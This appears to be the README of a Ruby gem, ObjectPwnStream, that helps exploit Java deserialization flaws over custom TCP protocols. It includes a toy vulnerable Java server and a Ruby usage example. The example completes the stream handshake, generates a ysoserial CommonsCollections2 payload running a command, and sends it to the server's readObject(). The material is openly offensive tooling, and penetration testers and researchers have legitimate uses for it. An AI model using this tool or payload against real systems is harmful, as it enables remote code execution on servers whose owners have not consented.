# ObjectPwnStream

a Ruby implementation of Java's `ObjectInputStream` and `ObjectOutputStream`, to ease the process of Java deserialization exploitation on custom TCP based network protocols.

## Installation

Add this line to your application's Gemfile:

```ruby
gem 'ObjectPwnStream'
```

And then execute:

    $ bundle

Or install it yourself as:

    $ gem install ObjectPwnStream

Or install it from main branch:

    $ git clone https://github.com/hakivvi/ObjectPwnStream
    $ cd ObjectPwnStream
    $ bundle install && bundle exec rake install
## Usage
the library provides a set of methods to mimic the methods of both `ObjectInputStream` and `ObjectOutputStream`,

the `readObject()` method is not always the first function run on a TCP socket, so you can't just feed the server with your serialized payload or else `java.io.StreamCorruptedException` will be thrown by the server.

take this [toy server](https://github.com/hakivvi/ObjectPwnStream/blob/main/spec/test/ToyServer.java) for example, which does read and write a bunch of types before actually calling `readObject()` which the attacker is usually interested in:
```java
                s = serverSock.accept();
                System.out.println("[+] Connection accepted from " + s.getInetAddress().getHostAddress() + ":" + s.getPort());
                
                oos = new ObjectOutputStream(s.getOutputStream());
                ois = new ObjectInputStream(s.getInputStream());

                oos.writeInt(serverVersion);
                oos.flush();
                System.out.printf("[>] writeInt(): 0x%x\n", serverVersion);

                System.out.printf("[<] readInt(): 0x%x\n", ois.readInt());

                oos.writeUTF(serverName);
                oos.flush();
                System.out.printf("[>] writeUTF(): %s\n", serverName);

                System.out.printf("[<] readUTF(): %s\n", ois.readUTF());


                oos.writeShort(0xabcd);
                oos.flush();
                System.out.printf("[>] writeShort(): 0x%x\n", 0xabcd);

                System.out.printf("[<] readShort(): 0x%x\n", ois.readShort());
                
                oos.writeLong(-12345);
                oos.flush();
                System.out.printf("[>] writeLong(): %d\n", -12345);

                System.out.printf("[<] readLong(): %d\n", ois.readLong());


                oos.writeObject(new ToyServer());
                oos.flush();
                System.out.println("[>] writeObject()");

                System.out.println("[<] readObject()");
                try {
                	ois.readObject();
               	} catch (Throwable e) {}
```
to reach the `readObject()` method in this server connection, we should read and write successively `int`, `utf`, `short` etc.
using `ObjectPwnStream` library, we can do just that:
```ruby
require 'ObjectPwnStream'

pwnStream = ObjectPwnStream::PwnStream.new("127.0.0.1", 9090)
pwnStream.connect!
pwnStream.open_streams!
pwnStream.read_int
pwnStream.write_int 0x1337
pwnStream.read_utf
pwnStream.write_utf "ObjectPwnStream"
pwnStream.read_short
pwnStream.write_short 0xabcd
pwnStream.read_long signed=true
pwnStream.write_long -12345
pwnStream.read_object
pwnStream.ysoserial_generate!("./ysoserial.jar","CommonsCollections2", "gnome-calculator", encode: true, windows: false)
pwnStream.write_object(ysoserial: true)
```
## PoC

![poc](https://user-images.githubusercontent.com/67718634/170808392-1ce8efff-b8c6-4372-8d7a-b20b4fbeadc9.gif)


## Development

After checking out the repo, run `bin/setup` to install dependencies. Then, run `rake spec` to run the tests. You can also run `bin/console` for an interactive prompt that will allow you to experiment.

To install this gem onto your local machine, run `bundle exec rake install`. To release a new version, update the version number in `version.rb`, and then run `bundle exec rake release`, which will create a git tag for the version, push git commits and tags, and push the `.gem` file to [rubygems.org](https://rubygems.org).

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/hakivvi/ObjectPwnStream. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.

## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).

## Code of Conduct

Everyone interacting in the ObjectPwnStream project’s codebases, issue trackers, chat rooms and mailing lists is expected to follow the [code of conduct](https://github.com/[USERNAME]/ObjectPwnStream/blob/master/CODE_OF_CONDUCT.md).

## Todo

- document all the functions.
- support CLI mode.
